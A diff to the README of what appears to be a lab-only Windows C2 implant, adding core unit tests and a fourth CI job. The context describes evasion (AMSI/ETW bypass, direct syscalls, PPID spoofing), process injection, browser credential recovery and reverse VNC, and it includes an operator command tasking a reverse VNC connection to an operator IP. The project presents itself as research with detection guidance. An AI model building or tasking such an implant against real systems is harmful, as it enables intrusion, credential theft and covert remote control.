@@ -13,7 +13,7 @@
 ![Key exchange](https://img.shields.io/badge/Key_exchange-ECDH_P--256-6F42C1?style=flat-square)
 ![Cipher](https://img.shields.io/badge/Cipher-AES--256--GCM-8250DF?style=flat-square)
 ![Protocol tests](https://img.shields.io/badge/Protocol_tests-34_checks-2EA043?style=flat-square)
-![CI](https://img.shields.io/badge/CI-3_jobs-8250DF?style=flat-square&logo=githubactions&logoColor=white)
+![CI](https://img.shields.io/badge/CI-4_jobs-8250DF?style=flat-square&logo=githubactions&logoColor=white)
 ![Scope](https://img.shields.io/badge/Scope-Lab_only-C93A2B?style=flat-square)
 
 </div>
@@ -578,7 +578,7 @@ server values route through one config dictionary.
 | `GHOST_BEACON_TOKEN` | Implant→server shared secret (server must match) | prompted; enter blank to generate and print a random one |
 | `GHOST_BEACON_MIN` / `GHOST_BEACON_MAX` | Jitter bounds, seconds (validated `3 ≤ min ≤ max`) | 18 / 24 |
 | `GHOST_C2_HOST` / `GHOST_C2_PORT` / `GHOST_BEACON_TOKEN_W` | Raw `-D` macros the script emits | set by `build.sh` |
-| `GHOST_SALT`, `GHOST_K0..K3` (`obfuscate.hpp`) | Build salt + rotating key feeding the per-string keystream seed — change per campaign build | salt `5D3A9F17C4B28E60`, key `A7 3E C1 58` |
+| `GHOST_SALT`, `GHOST_K0..K3` (`ghostcore.hpp`) | Build salt + rotating key feeding the per-string keystream seed — change per campaign build | salt `5D3A9F17C4B28E60`, key `A7 3E C1 58` |
 | `CMD_OUTPUT_MAX` / `CMD_TIMEOUT_MS` | 65536 chars of text result before truncation / 30 s per command | `include/config.hpp` |
 | `MAX_FAILURES` / `BACKOFF_FACTOR` / `BACKOFF_MAX_SEC` | The live failure-backoff ladder in `BeaconFailureBackoff` (`src/c2.cpp`): 5 / 3 / 1800 s → 18, 54, 162, 486, then 1458 s held | `include/config.hpp` |
 
@@ -688,6 +688,7 @@ python server/c2_cli.py task <sid> "!vnc <operator-ip>:5500"
 | Command | Coverage |
 |---|---|
 | `python tests/test_protocol.py` | **34 checks** against a live server instance: ECDH handshake, encrypt/decrypt round trips with tricky payloads, task/result flow, `tid` delivery + ack, at-least-once retry, duplicate-result dedup, replay-counter rejection, re-handshake after server restart, and wire-Base64 canonicality against the implant's strict decoder |
+| `g++ -std=c++17 -I include tests/test_core.cpp -o core && ./core` | **35 unit checks** on the platform-free core (`include/ghostcore.hpp`): base64 vectors and strictness, hex parsing, JSON escaping, keystream properties — runs on any OS with a C++17 compiler, and in CI |
 | `python tests/check_strings.py <exe> --secret <token> …` | Scans a release artifact for build secrets and for the strings that are supposed to be obfuscated — the mechanical check behind the "no plaintext in the binary" claim |
 | `powershell -File tests/test_browser.ps1` | `!browser` recovery logic against a **synthetic** profile in `%TEMP%` — one `v10` AES-GCM row and one legacy DPAPI row; no real browser data is read or touched |
 | `python tests/verify_chunks.py` | Asserts the XOR chunks embedded in `src/c2.cpp` reconstruct `tests/browser_dump.ps1` **byte-for-byte** |
@@ -699,7 +700,7 @@ the implant ships the compiled-out chunk form of its library section.
 ### Continuous integration
 
 [`.github/workflows/ci.yml`](.github/workflows/ci.yml) gates every push to `main` and every pull
-request with three jobs on `ubuntu-latest`:
+request with four jobs on `ubuntu-latest`:
 
 1. **Protocol tests** — Python 3.11, install `server/requirements.txt`, run `tests/test_protocol.py`.
 2. **Cross-compile** — install `mingw-w64`, build a release implant with placeholder values
@@ -713,10 +714,14 @@ request with three jobs on `ubuntu-latest`:
    event table, so a plausible-looking mapping mistake (treating event id 22 as a file
    download, or 25 as process access) fails CI instead of shipping a rule that silently never
    fires.
+4. **Core unit tests** — compile `tests/test_core.cpp` with `g++ -std=c++17 -Wall -Wextra -Werror`
+   and run it. The header it covers, `include/ghostcore.hpp`, has no Windows dependency, so the
+   base64 codec, hex parser, JSON escaping and XS/XSW keystream are tested natively — no
+   cross-toolchain and no WINE involved.
 
 A green CI therefore means "the channel still behaves correctly", "the implant still builds
-warning-clean", and "the detection layer still accounts for itself", without any live implant
-involved.
+warning-clean", "the pure logic still passes its unit tests", and "the detection layer still
+accounts for itself", without any live implant involved.
 
 ### Detection layer
 
@@ -861,6 +866,7 @@ ghostimplant/
 │   ├── c2.hpp              beacon loop + task dispatcher interface
 │   ├── config.hpp          build-time knobs, timing, output caps
 │   ├── obfuscate.hpp       XS/XSW XOR strings, FNV-1a, HashProc
+│   ├── ghostcore.hpp       platform-free core: base64, hex parser, JSON escape, keystream
 │   ├── syscalls.hpp        Nt* prototypes + resolved syscall table
 │   ├── evasion.hpp         AMSI/ETW/HWBP, sandbox, wake lock
 │   ├── injection.hpp       injection + PPID spoofing
@@ -869,8 +875,8 @@ ghostimplant/
 │   └── vnc.hpp             reverse-VNC server interface
 ├── src/
 │   ├── main.cpp        (374)   entry, PEB spoof, self-install, supervisor, startup order
-│   ├── c2.cpp          (2204)  transport, ECDH/AES, beacon loop, command table, all handlers
-│   ├── utils.cpp       (466)   AES-GCM + ECDH via BCrypt, base64, SHA-256, system info, jitter
+│   ├── c2.cpp          (2176)  transport, ECDH/AES, beacon loop, command table, all handlers
+│   ├── utils.cpp       (460)   AES-GCM + ECDH via BCrypt, SHA-256, system info, jitter
 │   ├── vnc.cpp         (415)   reverse RFB 3.3 server, tile diffing, SendInput replay
 │   ├── syscalls.cpp    (438)   Hell's Gate + Halo's Gate, direct + indirect trampolines
 │   ├── injection.cpp   (591)   remote-thread + APC + module-stomping chains, PPID spoofing
@@ -884,6 +890,7 @@ ghostimplant/
 │   └── ghost-c2.service        systemd unit for lab-VPS hosting
 ├── tests/
 │   ├── test_protocol.py        34 end-to-end channel checks
+│   ├── test_core.cpp           35 unit checks on the platform-free core (CI job 4)
 │   ├── check_strings.py        release-artifact plaintext scan (CI)
 │   ├── browser_dump.ps1        source of truth for the embedded recovery script
 │   ├── gen_browser_chunks.py   PowerShell → XSW chunks in c2.cpp
@@ -907,11 +914,13 @@ Contributions aimed at **research and detection value** are welcome.
 1. Branch from `main`; keep one technique per change so it stays individually measurable.
 2. Implant work must stay warning-clean with MinGW `-Wall -Wextra` and must not add API name or
    URL string literals — use `XS`/`XSW`/`FNV`/`HASHPROC`.
-3. Any protocol change requires a matching case in `tests/test_protocol.py`; both CI jobs must pass.
-4. Add or update the [ATT&CK row](#16-mitre-attck-mapping) and the [detection guidance](#17-detection-guidance)
+3. Pure logic — string codecs, parsers, keystreams — belongs in `include/ghostcore.hpp` with a
+   case in `tests/test_core.cpp`; if something only compiles on Windows, it is not core.
+4. Any protocol change requires a matching case in `tests/test_protocol.py`; all CI jobs must pass.
+5. Add or update the [ATT&CK row](#16-mitre-attck-mapping) and the [detection guidance](#17-detection-guidance)
    for anything new — an undocumented technique has no research value.
-5. Never commit tokens, tunnel URLs, `build/` output, `.exe` artifacts, or captures from a real target.
-6. Keep the authorized-use notice intact in any derived documentation.
+6. Never commit tokens, tunnel URLs, `build/` output, `.exe` artifacts, or captures from a real target.
+7. Keep the authorized-use notice intact in any derived documentation.
 
 ---
 
